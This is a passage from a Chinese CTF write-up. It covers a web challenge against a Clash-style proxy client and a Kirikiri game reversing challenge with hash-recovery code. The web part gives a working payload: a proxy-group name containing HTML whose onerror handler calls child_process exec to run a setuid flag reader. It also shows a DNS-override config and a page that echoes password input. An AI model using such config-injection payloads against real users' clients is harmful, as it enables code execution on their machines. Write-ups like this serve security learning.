</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>使用 hosts 字段指定域名解析结果为 VPS 的 ip 地址：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="m">7890</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">socks-port</span><span class="p">:</span><span class="w"> </span><span class="m">7891</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">allow-lan</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">mode</span><span class="p">:</span><span class="w"> </span><span class="l">Rule</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">log-level</span><span class="p">:</span><span class="w"> </span><span class="l">info</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">external-controller</span><span class="p">:</span><span class="w"> </span><span class="p">:</span><span class="m">9090</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">proxies</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">a</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">socks5</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">server</span><span class="p">:</span><span class="w"> </span><span class="m">127.0.0.1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;17938&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">skip-cert-verify</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">abc</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">socks5</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">server</span><span class="p">:</span><span class="w"> </span><span class="m">127.0.0.1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;8088&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">skip-cert-verify</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">proxy-groups</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">b</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">select</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">proxies</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="l">a</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">hosts</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">&#39;ys.pku.edu.cn&#39;</span><span class="p">:</span><span class="w"> </span><span class="l">&lt;ip&gt;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>写一个 HTML，让客户端打印 <code>password</code> 中的内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;zh&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Primogem Code Page<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;primogem_code&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;Enter your primogem code here&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;password_display&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">passwordInput</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;primogem_code&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">passwordDisplay</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;password_display&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nx">setInterval</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">passwordDisplay</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">passwordInput</span><span class="p">.</span><span class="nx">value</span>
</span></span><span class="line"><span class="cl">            <span class="p">},</span> <span class="mi">1000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="flag-3">Flag 3</h4>
<p>找到文件 <code>readflag</code>，它能读取 <code>/flag</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">FILE</span><span class="o">*</span> <span class="n">fp</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;/flag&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fgets</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>而 Dockerfile 中说有 sx 权限，意味着所有都能以 root 身份执行这个文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="k">RUN</span> <span class="nb">cd</span> /app <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    gcc readflag.c -o readflag <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    chown root:root readflag <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    chmod +sx readflag <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    chown -R node:node /home/node/.config<span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>所以用 <code>node</code> 执行这个文件就行了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="m">7890</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">socks-port</span><span class="p">:</span><span class="w"> </span><span class="m">7891</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">allow-lan</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">mode</span><span class="p">:</span><span class="w"> </span><span class="l">Rule</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">log-level</span><span class="p">:</span><span class="w"> </span><span class="l">info</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">external-controller</span><span class="p">:</span><span class="w"> </span><span class="p">:</span><span class="m">9090</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">proxies</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">a</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">socks5</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">server</span><span class="p">:</span><span class="w"> </span><span class="m">127.0.0.1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;17938&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">skip-cert-verify</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">abc</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">socks5</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">server</span><span class="p">:</span><span class="w"> </span><span class="m">127.0.0.1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;8088&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">skip-cert-verify</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">proxy-groups</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">&lt;img/src=&#34;1&#34;/onerror=&#34;const { exec } = require(&#39;child_process&#39;); exec(&#39;/app/readflag&#39;, (error, stdout, stderr) =&gt; { if (error) document.write(error); else document.write(&#39;&lt;code&gt;&lt;pre&gt;&#39;+stdout+&#39;&lt;/pre&gt;&lt;/code&gt;&#39;)})&#34;&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">select</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">proxies</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="l">a</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><br>
<h2 id="binary">Binary</h2>
<h3 id="13-汉化绿色版免费下载">13. 汉化绿色版免费下载</h3>
<h4 id="普通下载">普通下载</h4>
<p>游戏内容是输入两遍密码，如果相同就成功。但成功后的 <code>flag1</code> 没有显示，可能是设置了颜色，找出以前用过的 <a href="https://github.com/hanmin0822/MisakaTranslator/">MisakaTranslator</a> 来提取出现的文字内容。得到 <code>flag{did-you-unpack-the-xp3?}</code></p>
<h4 id="高速下载第二阶段">高速下载（第二阶段）</h4>
<p>第一题的 <code>flag</code> 提示使用 <code>xp3</code> 解包，用 xp3_upk 解包，得到代码文件。其中 <code>data/scenario/round1.ks</code> 记录了 hash 的计算过程：</p>
<details>
<summary>计算过程</summary>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">@eval exp=&#34;f.text = &#39;flag{&#39;&#34;
</span></span><span class="line"><span class="cl">@eval exp=&#34;f.hash = 1337&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*round_1|输入第一遍
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">首先输入第一遍。[p]
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*sel_loop|第一次输入
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">@jump storage=&#34;round2.ks&#34; cond=&#34;f.text.charAt(f.text.length-1)==&#39;}&#39;&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">当前文本：[emb exp=&#34;f.text&#34;][r]
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[link target=*sel_a clickse=&#34;SE_306&#34;]&gt; 输入 A[endlink][r]
</span></span><span class="line"><span class="cl">[link target=*sel_e clickse=&#34;SE_306&#34;]&gt; 输入 E[endlink][r]
</span></span><span class="line"><span class="cl">[link target=*sel_i clickse=&#34;SE_306&#34;]&gt; 输入 I[endlink][r]
</span></span><span class="line"><span class="cl">[link target=*sel_o clickse=&#34;SE_306&#34;]&gt; 输入 O[endlink][r]
</span></span><span class="line"><span class="cl">[link target=*sel_u clickse=&#34;SE_306&#34;]&gt; 输入 U[endlink][r]
</span></span><span class="line"><span class="cl">[link target=*sel_fin clickse=&#34;SE_306&#34;]&gt; 输入 }[endlink][r]
</span></span><span class="line"><span class="cl">[s]
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*sel_a
</span></span><span class="line"><span class="cl">@eval exp=&#34;f.text = f.text + &#39;A&#39;&#34;
</span></span><span class="line"><span class="cl">@eval exp=&#34;f.hash = f.hash * 13337 + 11&#34;
</span></span><span class="line"><span class="cl">@jump target=*sel_end
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*sel_e
</span></span><span class="line"><span class="cl">@eval exp=&#34;f.text = f.text + &#39;E&#39;&#34;
</span></span><span class="line"><span class="cl">@eval exp=&#34;f.hash = f.hash * 13337 + 22&#34;
</span></span><span class="line"><span class="cl">@jump target=*sel_end
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*sel_i
</span></span><span class="line"><span class="cl">@eval exp=&#34;f.text = f.text + &#39;I&#39;&#34;
</span></span><span class="line"><span class="cl">@eval exp=&#34;f.hash = f.hash * 13337 + 33&#34;
</span></span><span class="line"><span class="cl">@jump target=*sel_end
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*sel_o
</span></span><span class="line"><span class="cl">@eval exp=&#34;f.text = f.text + &#39;O&#39;&#34;
</span></span><span class="line"><span class="cl">@eval exp=&#34;f.hash = f.hash * 13337 + 44&#34;
</span></span><span class="line"><span class="cl">@jump target=*sel_end
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*sel_u
</span></span><span class="line"><span class="cl">@eval exp=&#34;f.text = f.text + &#39;U&#39;&#34;
</span></span><span class="line"><span class="cl">@eval exp=&#34;f.hash = f.hash * 13337 + 55&#34;
</span></span><span class="line"><span class="cl">@jump target=*sel_end
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*sel_fin
</span></span><span class="line"><span class="cl">@eval exp=&#34;f.text = f.text + &#39;}&#39;&#34;
</span></span><span class="line"><span class="cl">@eval exp=&#34;f.hash = f.hash * 13337 + 66&#34;
</span></span><span class="line"><span class="cl">@jump target=*sel_end
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*sel_end
</span></span><span class="line"><span class="cl">@eval exp=&#34;f.hash = f.hash % 19260817&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">输入完成！[p]
</span></span><span class="line"><span class="cl">@jump target=*sel_loop
</span></span></code></pre></td></tr></table>
</div>
</div></details>
<p>但是 hash 相同的字符串有很多，不能唯一确定答案。</p>
<p>第二阶段的提示是查看 <code>datasu.ksd</code>。找了 KirikiriDescrambler 解包，得到</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">%[
</span></span><span class="line"><span class="cl"> &#34;trail_round1_sel_i&#34; =&gt; int 1,
</span></span><span class="line"><span class="cl"> &#34;autotrail_func_init&#34; =&gt; int 1,
</span></span><span class="line"><span class="cl"> &#34;trail_func_init&#34; =&gt; int 1,
</span></span><span class="line"><span class="cl"> &#34;autotrail_first_start&#34; =&gt; int 1,
</span></span><span class="line"><span class="cl"> &#34;autotrail_round1_sel_i&#34; =&gt; int 1,
</span></span><span class="line"><span class="cl"> &#34;trail_round1_round_1&#34; =&gt; int 1,
</span></span><span class="line"><span class="cl"> &#34;trail_autolabel_autoLabelLabel&#34; =&gt; int 18,
</span></span><span class="line"><span class="cl"> &#34;autotrail_round1_sel_end&#34; =&gt; int 2,
</span></span><span class="line"><span class="cl"> &#34;trail_round1_sel_fin&#34; =&gt; int 1,
</span></span><span class="line"><span class="cl"> &#34;autotrail_autolabel_autoLabelLabel&#34; =&gt; int 2,
</span></span><span class="line"><span class="cl"> &#34;trail_round1_sel_a&#34; =&gt; int 6,
</span></span><span class="line"><span class="cl"> &#34;autotrail_round1_sel_e&#34; =&gt; int 1,
</span></span><span class="line"><span class="cl"> &#34;trail_first_start&#34; =&gt; int 1,
</span></span><span class="line"><span class="cl"> &#34;trail_round1_sel_loop&#34; =&gt; int 18,
</span></span><span class="line"><span class="cl"> &#34;autotrail_round1_sel_a&#34; =&gt; int 1,
</span></span><span class="line"><span class="cl"> &#34;autotrail_round1_sel_o&#34; =&gt; int 1,
</span></span><span class="line"><span class="cl"> &#34;trail_round1_sel_end&#34; =&gt; int 17,
</span></span><span class="line"><span class="cl"> &#34;autotrail_round1_sel_loop&#34; =&gt; int 1,
</span></span><span class="line"><span class="cl"> &#34;autotrail_round1_sel_fin&#34; =&gt; int 1,
</span></span><span class="line"><span class="cl"> &#34;trail_round1_sel_e&#34; =&gt; int 3,
</span></span><span class="line"><span class="cl"> &#34;autotrail_round2_round_2&#34; =&gt; int 1,
</span></span><span class="line"><span class="cl"> &#34;trail_round1_sel_o&#34; =&gt; int 6,
</span></span><span class="line"><span class="cl"> &#34;autotrail_round1_round_1&#34; =&gt; int 2
</span></span><span class="line"><span class="cl">]
</span></span></code></pre></td></tr></table>
</div>
</div><p>这可能是说 <code>sel_a</code> <code>sel_e</code> <code>sel_i</code> <code>sel_o</code> 四个标签的跳转次数（相当于结果中各个字符出现次数）分别是 6 3 1 6。使用 DFS 计算出输入内容是 <code>flag{OOAAAAEAEIEAOOOO}</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">icecream</span> <span class="kn">import</span> <span class="n">ic</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">update_hash</span><span class="p">(</span><span class="n">f_hash</span><span class="p">,</span> <span class="n">char_value</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">f_hash</span> <span class="o">=</span> <span class="p">(</span><span class="n">f_hash</span> <span class="o">*</span> <span class="mi">13337</span> <span class="o">+</span> <span class="n">char_value</span><span class="p">)</span> <span class="o">%</span> <span class="mi">19260817</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">f_hash</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hash</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">f_hash</span> <span class="o">=</span> <span class="mi">1337</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">string</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">char</span> <span class="o">==</span> <span class="s1">&#39;A&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">f_hash</span> <span class="o">=</span> <span class="n">update_hash</span><span class="p">(</span><span class="n">f_hash</span><span class="p">,</span> <span class="mi">11</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">char</span> <span class="o">==</span> <span class="s1">&#39;E&#39;</span><span class="p">:</span>
